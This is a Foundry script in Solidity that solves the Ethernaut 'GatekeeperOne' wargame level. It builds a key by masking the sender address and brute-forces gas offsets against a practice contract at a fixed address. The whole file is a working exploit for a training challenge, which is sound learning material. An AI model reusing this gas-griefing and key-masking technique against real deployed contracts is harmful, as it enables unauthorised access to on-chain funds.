// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "../src/13_GatekeeperOne.sol";
import {Script, console} from "forge-std/Script.sol";

contract GatekeeperOneSolve is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        new Attack().pwn();

        vm.stopBroadcast();
    }
}

contract Attack {
    GatekeeperOne gate = GatekeeperOne(0x5F0C1Db0CEfCD6BA92159a0C03D7542738e5Ec1d);

    function pwn() external {
        bytes8 passkey = bytes8(uint64(uint160(msg.sender))) & 0xffffffff0000ffff;
        for (uint256 i = 100; i <= 300; i++) {
            try gate.enter{gas: 32764 + i}(passkey) {
                console.log("Solved at Gas#", uint256(32764 + i));
                break;
            } catch {}
        }
    }
}

// uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
// uint32(uint64(_gateKey)) != uint64(_gateKey)
// uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
//                      0x????000033c0 ==  0x33c0
//
